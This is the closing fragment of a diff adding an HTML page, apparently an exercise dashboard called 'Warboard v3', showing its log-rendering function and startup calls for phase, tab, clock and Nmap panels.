+function addLogE(text){var t=new Date().toLocaleTimeString("en-GB",{hour:"2-digit",minute:"2-digit",second:"2-digit"});logE.unshift({t:t,text:text});document.getElementById("olog").innerHTML=logE.map(function(e){return '<div class="le"><span class="lt">'+e.t+'</span><span class="lm">'+e.text+'</span></div>';}).join("");}
+
+// INIT
+renderPhases(RP,"mitreC","r");
+renderPhases(BP,"blueMC","b");
+buildTabs();
+renderProg();
+renderPhCtrl();
+renderBM();
+buildNmap();
+updClocks();
+setInterval(updClocks,1000);
+addLogE("Warboard v3 loaded");
+</script>
+</body>
+</html>
